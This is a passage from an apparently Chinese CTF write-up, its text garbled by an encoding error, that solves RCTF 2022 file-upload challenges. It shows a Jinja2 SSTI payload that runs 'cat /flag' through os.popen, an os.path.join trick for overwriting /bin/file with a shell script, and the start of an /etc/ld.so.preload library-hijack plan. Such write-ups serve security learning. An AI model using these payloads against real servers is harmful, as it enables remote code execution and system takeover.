class="keyword">and</span> <span class="string">&quot;..&quot;</span> <span class="keyword">in</span> filepath:</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">&quot;Don&#x27;t (^=â—•á´¥â—•=^) (^=â—•á´¥â—•=^) (^=â—•á´¥â—•=^)&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                f.save(filepath)</span><br><span class="line">                file_check_res = subprocess.check_output(</span><br><span class="line">                    [<span class="string">&quot;/bin/file&quot;</span>, <span class="string">&quot;-b&quot;</span>, filepath], </span><br><span class="line">                    shell=<span class="literal">False</span>, </span><br><span class="line">                    encoding=<span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">                    timeout=<span class="number">1</span></span><br><span class="line">                )</span><br><span class="line">                os.remove(filepath)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;empty&quot;</span> <span class="keyword">in</span> file_check_res <span class="keyword">or</span> <span class="string">&quot;cannot open&quot;</span> <span class="keyword">in</span> file_check_res:</span><br><span class="line">                    file_check_res=<span class="string">&quot;wafxixi à¸…â€¢Ï‰â€¢à¸… à¸…â€¢Ï‰â€¢à¸… à¸…â€¢Ï‰â€¢à¸…&quot;</span></span><br><span class="line">                <span class="keyword">return</span> render_template_string(file_check_res)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">&#x27;Error à¸…(à¹‘*Ğ´*à¹‘)à¸… à¸…(à¹‘*Ğ´*à¹‘)à¸… à¸…(à¹‘*Ğ´*à¹‘)à¸…&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    serve(app, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">3000</span>, threads=<span class="number">1000</span>, cleanup_interval=<span class="number">30</span>)</span><br></pre></td></tr></table></figure>

<p>å¼€å§‹çœ‹åˆ°<code>flask</code>å°±çŒœæƒ³è¿™é‡Œå­˜åœ¨çš„æ˜¯<code>ssti</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œå‘ç°å®ƒå¯¹æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œ<code>file</code>å‘½ä»¤</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"> file_check_res = subprocess.check_output(</span><br><span class="line">   [<span class="string">&quot;/bin/file&quot;</span>, <span class="string">&quot;-b&quot;</span>, filepath], </span><br><span class="line">   shell=<span class="literal">False</span>, </span><br><span class="line">   encoding=<span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">   timeout=<span class="number">1</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°†è¿”å›å€¼ä¼ ç»™<code>file_check_res</code></p>
<p>æœ€åä¸€è¡Œæ˜¯å…³é”®</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template_string(file_check_res)</span><br></pre></td></tr></table></figure>

<p>å®ƒå°†<code>file_check_res</code>è¿›è¡Œæ¸²æŸ“ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶<code>file</code>å‘½ä»¤åçš„æ–‡ä»¶è¿”å›å€¼æ˜¯ä¸€ä¸ª<code>ssti</code>æ³¨å…¥è¯­å¥é‚£ä¹ˆå°±å¯ä»¥å®ç°å¯¹ç½‘ç«™çš„<code>ssti</code>ï¼Œå¹¶åˆ©ç”¨è¿™ä¸ªè¿”å›å€¼è¿”å›<code>flag</code></p>
<p>å¦‚æœå•çº¯å†™ä¸ªåŒ…å«sstiè¯­å¥çš„æ–‡æœ¬</p>
<p><img src="/post/2022RCTF/image-20230312223454421.png" alt="image-20230312223454421"></p>
<p>å‘ç°æ‰§è¡Œå®Œ<code>file -b</code>åï¼Œæ‰§è¡Œååªæ˜¾ç¤ºæ–‡ä»¶ç±»å‹</p>
<h3 id="file-bè§£æ-åå†…å®¹æ˜¾ç¤º"><a href="#file-bè§£æ-åå†…å®¹æ˜¾ç¤º" class="headerlink" title="file -bè§£æ#!åå†…å®¹æ˜¾ç¤º"></a>file -bè§£æ#!åå†…å®¹æ˜¾ç¤º</h3><p>è¿™é‡Œå°±éœ€è¦ä¸€ä¸ªçŸ¥è¯†ç‚¹<code>#!</code>åçš„å†…å®¹ï¼Œä¼šè¢«è§†ä¸ºæ–‡ä»¶çš„è§£é‡Šå™¨ï¼Œç„¶åæ‰“å°å‡ºæ¥ï¼Œæ¯”å¦‚</p>
<p><img src="/post/2022RCTF/image-20230312224705119.png" alt="image-20230312224705119"></p>
<p>è¿™é‡Œ</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">a </span><span class="template-variable">&#123;&#123;<span class="name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> script, ASCII text executable</span></span><br></pre></td></tr></table></figure>

<p>å°±çœ‹å‡ºæ¥å®ƒæŠŠæ–‡æœ¬</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>å½“ä½œäº†<code>script</code>è§£æå™¨ï¼Œåœ¨è§£ææ–‡ä»¶ç±»å‹æ—¶ï¼Œå°±æŠŠå®ƒæ‰“å°å‡ºæ¥äº†</p>
<p>äºæ˜¯æˆ‘ä»¬ä¸Šä¼ è¯¥æ–‡ä»¶</p>
<p><img src="/post/2022RCTF/image-20230312224941575.png" alt="image-20230312224941575"></p>
<p>å¾—åˆ°flag</p>
<h2 id="filecheacker-pro"><a href="#filecheacker-pro" class="headerlink" title="filecheacker_pro"></a>filecheacker_pro</h2><blockquote>
<p>hint:<code>An easier file check challenge.</code><br><code>The zip decompression password is the flag value of filechecker_mini.</code><br><code>Test your exploit locally first.</code><br><code>The challenging environment restarts every three minutes.</code></p>
<p>æ›´ç®€å•çš„æ–‡ä»¶æ£€æŸ¥æŒ‘æˆ˜ã€‚<br>zip è§£å‹ç¼©å¯†ç æ˜¯ filechecker_mini çš„flagã€‚<br>é¦–å…ˆåœ¨æœ¬åœ°æµ‹è¯•æ¼æ´åˆ©ç”¨ã€‚<br>å…·æœ‰æŒ‘æˆ˜æ€§çš„ç¯å¢ƒæ¯ä¸‰åˆ†é’Ÿé‡æ–°å¯åŠ¨ä¸€æ¬¡ã€‚</p>
</blockquote>
<p>çœ‹çœ‹æºç å’Œminiçš„åŒºåˆ«</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line"><span class="keyword">from</span> waitress <span class="keyword">import</span> serve</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app_dir = os.path.split(os.path.realpath(__file__))[<span class="number">0</span>]</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">f&#x27;<span class="subst">&#123;app_dir&#125;</span>/upload/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,result=<span class="string">&quot;ãƒ½(=^ï½¥Ï‰ï½¥^=)ä¸¿ ãƒ½(=^ï½¥Ï‰ï½¥^=)ä¸¿ ãƒ½(=^ï½¥Ï‰ï½¥^=)ä¸¿&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            f = request.files[<span class="string">&#x27;file-upload&#x27;</span>]</span><br><span class="line">            filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(filepath) <span class="keyword">and</span> <span class="string">&quot;..&quot;</span> <span class="keyword">in</span> filepath:</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">&quot;Don&#x27;t (^=â—•á´¥â—•=^) (^=â—•á´¥â—•=^) (^=â—•á´¥â—•=^)&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                f.save(filepath)</span><br><span class="line">                file_check_res = subprocess.check_output(</span><br><span class="line">                    [<span class="string">&quot;/bin/file&quot;</span>, <span class="string">&quot;-b&quot;</span>, filepath], </span><br><span class="line">                    shell=<span class="literal">False</span>, </span><br><span class="line">                    encoding=<span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">                    timeout=<span class="number">1</span></span><br><span class="line">                )</span><br><span class="line">                os.remove(filepath)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;empty&quot;</span> <span class="keyword">in</span> file_check_res <span class="keyword">or</span> <span class="string">&quot;cannot open&quot;</span> <span class="keyword">in</span> file_check_res:</span><br><span class="line">                    file_check_res=<span class="string">&quot;wafxixi à¸…â€¢Ï‰â€¢à¸… à¸…â€¢Ï‰â€¢à¸… à¸…â€¢Ï‰â€¢à¸…&quot;</span></span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=file_check_res)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">&#x27;Error à¸…(à¹‘*Ğ´*à¹‘)à¸… à¸…(à¹‘*Ğ´*à¹‘)à¸… à¸…(à¹‘*Ğ´*à¹‘)à¸…&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    serve(app, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">3000</span>, threads=<span class="number">1000</span>, cleanup_interval=<span class="number">30</span>)</span><br></pre></td></tr></table></figure>

<p>å‘ç°åœ¨</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=file_check_res)</span><br></pre></td></tr></table></figure>

<p>çœ‹æ¥æ˜¯æ— æ³•è¿›è¡Œsstiæ³¨å…¥</p>
<p>åé¢æŸ¥çœ‹wpå‘ç°<code>os.path.join</code>å­˜åœ¨ä¸€ä¸ªæŠ€å·§</p>
<p>å¦‚æœåªæ˜¯å•çº¯çš„æ–‡ä»¶åå­—</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">os</span>.<span class="built_in">path</span>.join(<span class="string">&#x27;path&#x27;</span>,<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;yyy.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆè·¯å¾„å°±æ˜¯<code>path/abc/yyy.txt</code></p>
<p>å¦‚æœåé¢çš„å‚æ•°åŒ…å«äº†<code>&#39;/&#39;</code>ï¼Œé‚£ä¹ˆå‰é¢çš„è·¯å¾„å°±ä¼šè¢«å¿½ç•¥</p>
<p>æ¯”å¦‚ï¼Œ</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">os.path.join(<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;/bbb/ccc.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆè·¯å¾„å°±æ˜¯<code>/bbb/ccc.txt</code>ï¼Œè€Œå‰é¢å¾—<code>aaa</code>ç›®å½•è·¯å¾„å°±è¢«æ— è§†äº†</p>
<p>äºæ˜¯åœ¨æºç ä¸­è¿™é‡Œï¼Œ</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæˆ‘ä»¬çš„æ–‡ä»¶åæ”¹æˆ<code>/bin/file</code>ä¼šæ€ä¹ˆæ ·å‘¢â€¦</p>
<p>é‚£å°±ä»£è¡¨<code>/bin/file</code>æ–‡ä»¶å°±è¢«æˆ‘ä»¬è¦†ç›–äº†ï¼Œäºæ˜¯å¯ä»¥ä¸ç”¨<code>..</code>è·¨ç›®å½•ä¹Ÿå¯ä»¥è¿›è¡Œæ–‡ä»¶ä¸Šä¼ æˆ–è€…è¦†ç›–</p>
<p>å½“åœ¨è¿™é‡Œæ‰§è¡Œ<code>/bin/file</code>æ—¶ï¼Œå°±ç›¸å½“äºæ‰§è¡Œæˆ‘ä»¬çš„æ–‡ä»¶å†…å®¹</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">file_check_res = subprocess.check_output(</span><br><span class="line">                   [<span class="string">&quot;/bin/file&quot;</span>, <span class="string">&quot;-b&quot;</span>, filepath], </span><br><span class="line">                   shell=<span class="literal">False</span>, </span><br><span class="line">                   encoding=<span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">                   timeout=<span class="number">1</span></span><br><span class="line">               ) file_check_res = subprocess.check_output(</span><br><span class="line">                   [<span class="string">&quot;/bin/file&quot;</span>, <span class="string">&quot;-b&quot;</span>, filepath], </span><br><span class="line">                   shell=<span class="literal">False</span>, </span><br><span class="line">                   encoding=<span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">                   timeout=<span class="number">1</span></span><br><span class="line">               )</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆå°±æ˜¾è€Œæ˜“è§æˆ‘ä»¬å¯ä»¥æ„é€ </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å¾—åˆ°flag</p>
<blockquote>
<p>æ³¨æ„unixä¸­æ˜¯è¡Œå°¾åªæœ‰æ¢è¡Œä¹Ÿå°±æ˜¯<code>\n</code>ï¼Œè€Œwinä¸­æ‰æ˜¯ä»¥<code>\r\n</code>ç»“å°¾</p>
<p>è€Œbpä¸­æ”¹åŒ…çš„æ—¶å€™ï¼Œå›è½¦ä¼šä»¥winæ–¹å¼ç”Ÿæˆ<code>\r\n</code>è¿™ä¸¤ä¸ª ,æ‰€ä»¥å¦‚æœç›´æ¥ä¼ ä¸Šå»è¦†ç›–<code>/bin/file</code>ï¼Œå®é™…ä¸Šæ ¼å¼æ˜¯é”™è¯¯çš„ï¼Œæ— æ³•æ‰§è¡Œï¼Œå°±ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥éœ€è¦åˆ é™¤<code>\r</code></p>
</blockquote>
<p><img src="/post/2022RCTF/image-20230314163249778.png" alt="image-20230314163249778"></p>
<h2 id="filecheacker-pro-max"><a href="#filecheacker-pro-max" class="headerlink" title="filecheacker_pro_max"></a>filecheacker_pro_max</h2><blockquote>
<p>hint:<code>The zip decompression password is the flag value of filechecker_plus.</code><br><code>Test your exploit locally first.</code><br><code>The challenging environment restarts every three minutes.</code></p>
<p>zip è§£å‹ç¼©å¯†ç æ˜¯ filechecker_plus çš„flagã€‚<br>é¦–å…ˆåœ¨æœ¬åœ°æµ‹è¯•æ¼æ´åˆ©ç”¨ã€‚<br>å…·æœ‰æŒ‘æˆ˜æ€§çš„ç¯å¢ƒæ¯ä¸‰åˆ†é’Ÿé‡æ–°å¯åŠ¨ä¸€æ¬¡ã€‚</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">from</span> waitress <span class="keyword">import</span> serve</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app_dir = os.path.split(os.path.realpath(__file__))[<span class="number">0</span>]</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">f&#x27;<span class="subst">&#123;app_dir&#125;</span>/upload/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,result=<span class="string">&quot;ãƒ½(=^ï½¥Ï‰ï½¥^=)ä¸¿ ãƒ½(=^ï½¥Ï‰ï½¥^=)ä¸¿ ãƒ½(=^ï½¥Ï‰ï½¥^=)ä¸¿&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            f = request.files[<span class="string">&#x27;file-upload&#x27;</span>]</span><br><span class="line">            filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">f&quot;<span class="subst">&#123;filepath&#125;</span> already exists (^=â—•á´¥â—•=^) (^=â—•á´¥â—•=^) (^=â—•á´¥â—•=^)&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                f.save(filepath)</span><br><span class="line">                file_check_res = subprocess.check_output(</span><br><span class="line">                    [<span class="string">&quot;/bin/file&quot;</span>, <span class="string">&quot;-b&quot;</span>, filepath], </span><br><span class="line">                    shell=<span class="literal">False</span>, </span><br><span class="line">                    encoding=<span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">                    timeout=<span class="number">1</span></span><br><span class="line">                )</span><br><span class="line">                os.remove(filepath)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;empty&quot;</span> <span class="keyword">in</span> file_check_res <span class="keyword">or</span> <span class="string">&quot;cannot open&quot;</span> <span class="keyword">in</span> file_check_res:</span><br><span class="line">                    file_check_res=<span class="string">&quot;wafxixi à¸…â€¢Ï‰â€¢à¸… à¸…â€¢Ï‰â€¢à¸… à¸…â€¢Ï‰â€¢à¸…&quot;</span></span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=file_check_res)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">&#x27;Error à¸…(à¹‘*Ğ´*à¹‘)à¸… à¸…(à¹‘*Ğ´*à¹‘)à¸… à¸…(à¹‘*Ğ´*à¹‘)à¸…&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    serve(app, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">3000</span>, threads=<span class="number">1000</span>, cleanup_interval=<span class="number">30</span>)</span><br></pre></td></tr></table></figure>

<p>å’Œä¸Šé“é¢˜ç›®é¢˜ç›®ä¸åŒï¼Œè¿™é“é¢˜ä¿®å¤äº†æ–‡ä»¶è¦†ç›–ï¼Œ</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">f&quot;<span class="subst">&#123;filepath&#125;</span> already exists (^=â—•á´¥â—•=^) (^=â—•á´¥â—•=^) (^=â—•á´¥â—•=^)&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä»ç„¶å¯ä»¥åˆ©ç”¨è¿™é‡Œ</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)</span><br></pre></td></tr></table></figure>

<p>è¿›è¡Œè·¨ç›®å½•æ–‡ä»¶ä¸Šä¼ </p>
<p>æˆ‘ä»¬ä»ç„¶éœ€è¦å®ç°rceï¼Œä½†æ˜¯æœåŠ¡å™¨shellä¸­å”¯ä¸€æ‰§è¡Œçš„å‘½ä»¤åªæœ‰<code>/bin/file -b</code></p>
<h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><blockquote>
<ul>
<li>ä½¿ç”¨ <code>strace</code> å‘½ä»¤æŸ¥çœ‹ç³»ç»Ÿè°ƒç”¨ã€é€šè¿‡è¿™ä¸ªå‘½ä»¤ï¼ŒæŸ¥çœ‹<code>/bin/file</code>å‘½ä»¤æ‰§è¡Œçš„è°ƒç”¨è¿‡ç¨‹ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å¯ä»¥ä¸­é—´åˆ©ç”¨åŠ«æŒçš„ï¼Œè¿™ä¸ªéœ€è¦è¿›dockerä¸­æŸ¥çœ‹ã€‘</li>
<li></li>
</ul>
</blockquote>
<p>æˆ‘ä»¬éœ€è¦æ‰¾çš„æ˜¯<code>/bin/file</code>å‘½ä»¤æ‰§è¡Œè¿‡ç¨‹ä¸­è°ƒç”¨çš„æ–‡ä»¶ï¼Œå¹¶ä¸”è¿™ä¸ªæ–‡ä»¶ä¸å­˜åœ¨ï¼Œè¿™æ ·æˆ‘ä»¬æ‰å¯ä»¥æˆåŠŸä¸Šä¼ </p>
<p><img src="/post/2022RCTF/image-20230315000016107.png" alt="image-20230315000016107"></p>
<p>è¿™é‡Œå°±çœ‹åˆ°ä¸€ä¸ªåˆé€‚çš„ç›®æ ‡æ–‡ä»¶</p>
<blockquote>
<p><code>/etc/ld.so.preload</code>ï¼Œå› ä¸ºå…¶ä¸å­˜åœ¨ï¼Œä½†æ˜¯åœ¨æ‰§è¡Œ<code>/bin/file</code>æ—¶ä¼šè°ƒç”¨å®ƒ</p>
<p>ç¡®å®ä¸è®¤è¯†è¿™ä¸ªæ–‡ä»¶ï¼Œæœä¸€ä¸‹å¾—åˆ°</p>
</blockquote>
<blockquote>
<p><code>/etc/ld.so.preload</code>åœ¨æŸç§ç¨‹åº¦ä¸Šå–ä»£äº†<em>LD_PRELOAD</em>ã€‚</p>
<p><em>ç”±äº</em>å®‰å…¨é—®é¢˜ï¼Œ<code>LD_PRELOAD</code>å—åˆ°ä¸¥æ ¼çš„é™åˆ¶ï¼šå®ƒ<code>ä¸èƒ½æ‰§è¡Œä»»æ„çš„setuidäºŒè¿›åˆ¶æ–‡ä»¶</code>ï¼Œå› ä¸ºå¦‚æœå¯ä»¥çš„è¯ï¼Œä½ å¯ä»¥ç”¨è‡ªå·±çš„æ¶æ„ä»£ç æ›¿æ¢åº“ä¾‹ç¨‹ï¼Œä¾‹å¦‚åœ¨è¿™é‡Œè¿›è¡Œå¾ˆå¥½çš„è®¨è®ºã€‚äº‹å®ä¸Šï¼Œä½ å¯ä»¥åœ¨<a href="https://linux.die.net/man/8/ld.so">ld.soç”¨æˆ·æ‰‹å†Œ</a>ä¸­é˜…è¯»ï¼š</p>
<blockquote>
<p><strong>LD_PRELOAD</strong></p>
<p>è¦åœ¨æ‰€æœ‰å…¶ä»–åº“ä¹‹å‰åŠ è½½çš„å…¶ä»–ç”¨æˆ·æŒ‡å®šçš„ ELF å…±äº«åº“çš„åˆ—è¡¨ã€‚åˆ—è¡¨ä¸­çš„é¡¹ç›®å¯ä»¥ç”¨ç©ºæ ¼æˆ–å†’å·åˆ†éš”ã€‚è¿™å¯ç”¨äºæœ‰é€‰æ‹©åœ°è¦†ç›–å…¶ä»–å…±äº«åº“ä¸­çš„å‡½æ•°ã€‚ä½¿ç”¨â€œè¯´æ˜â€ä¸‹ç»™å‡ºçš„è§„åˆ™æœç´¢åº“ã€‚å¯¹äº set-user-ID&#x2F;set-group-ID ELF äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå°†å¿½ç•¥åŒ…å«æ–œæ çš„é¢„åŠ è½½è·¯å¾„åï¼Œå¹¶ä¸”ä»…å½“åœ¨åº“æ–‡ä»¶ä¸Šå¯ç”¨äº† set-user-ID æƒé™ä½æ—¶ï¼Œæ‰ä¼šåŠ è½½æ ‡å‡†æœç´¢ç›®å½•ä¸­çš„åº“ã€‚</p>
</blockquote>
<p>ç›¸åï¼Œæ–‡ä»¶ &#x2F;etc&#x2F;<em>ld.so.preload</em> æ²¡æœ‰è¿™æ ·çš„é™åˆ¶ï¼Œå…¶æƒ³æ³•æ˜¯ï¼Œå¦‚æœä½ <code>å¯ä»¥è¯»/å†™ç›®å½• /etc</code>ï¼Œä½ å°±å·²ç»æœ‰äº† root å‡­æ®ã€‚å› æ­¤å®ƒçš„ä½¿ç”¨ã€‚</p>
<p>è¯·è®°ä½<em>ï¼Œå³ä½¿ä¸€å¼€å§‹</em>æ‚¨ä¼¼ä¹æ²¡æœ‰ <code>/etc/ld.so.preload</code>ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>/etc/ld.so.preload</code>ï¼šå®ƒåªä¸è¿‡æ˜¯ <em><code>glibc</code></em> çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå› æ­¤æ˜¯æ‰€æœ‰ Linux å‘è¡Œç‰ˆï¼ˆä½†æ®æˆ‘æ‰€çŸ¥ï¼Œä¸æ˜¯ Unix é£æ ¼ï¼‰ï¼Œå› æ­¤æ‚¨å¯ä»¥åˆ›å»ºå®ƒå¹¶å°†ä»»ä½• Linux å‘è¡Œç‰ˆä¸­<strong>ä»»ä½•</strong> setuid åº“çš„åç§°æ”¾å…¥å…¶ä¸­ï¼Œ å®ƒä¼šèµ·ä½œç”¨ã€‚</p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯è¯´å®ƒæ˜¯ä¸€ä¸ªåŠ è½½åº“çš„é…ç½®æ–‡ä»¶ï¼Œç›¸å½“äºå‘½ä»¤çš„æ‰€éœ€åº“çš„é…ç½®ï¼Œå½“å‘½ä»¤æ‰§è¡Œæ—¶å…¶ä¸­çš„äºŒè¿›åˆ¶é…ç½®æ–‡ä»¶ä¹Ÿä¼šè¢«è®¤ä¸ºæ˜¯è¯¥å‘½ä»¤æ‰§è¡Œçš„ä¸€ä¸ªéƒ¨åˆ†è¿›è¡ŒåŠ è½½æ‰§è¡Œ</p>
<blockquote>
<p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸Šä¼ ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯èƒ½å¤Ÿæ‰§è¡Œ<code>cat /flag</code>çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯<code>/etc/ld.so.preload</code>æ–‡ä»¶ï¼Œè€Œä¸”<code>/etc/ld.so.preload</code>ä¸­éœ€è¦åŒ…å«æ”¹äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„ï¼Œä»¥å®ç°åŠ è½½çš„ç›®çš„</p>
</blockquote>
<blockquote>
<p>*æ‰€è°“çš„åº“ï¼Œå®é™…ä¸Šå°±æ˜¯<code>/bin/file</code>å‘½ä»¤æ‰§è¡Œè¿‡ç¨‹ä¸­ç”¨åˆ°çš„å‡½æ•°çš„å®šä¹‰åº“ï¼Œè€Œä¸Šä¼ çš„äºŒè¿›åˆ¶æ–‡ä»¶çš„ä¸»è¦ç›®çš„å°±æ˜¯åŠ«æŒ<code>/bin/file</code>å‘½ä»¤ä¸­çš„åˆ©ç”¨çš„å‡½æ•°ï¼Œè¿›è¡Œé‡æ–°å®šä¹‰</p>
</blockquote>
<p>åœ¨<a href="https://github.com/file/file/blob/30ad4181ef4f2f09d36aee1163386b8d2904d0e0/src/magic.h.in">file&#x2F;magic.h.in at 30ad4181ef4f2f09d36aee1163386b8d2904d0e0 Â· file&#x2F;file (github.com)</a>ä¸­æŸ¥çœ‹fileåˆ©ç”¨çš„å‡½æ•°ï¼Œå‘ç°<code>magic_version()</code>å¾ˆåˆé€‚ï¼Œå› ä¸ºå®ƒä¸éœ€è¦å‚æ•°</p>
<p><img src="/post/2022RCTF/image-20230315210955814.png" alt="image-20230315210955814"></p>
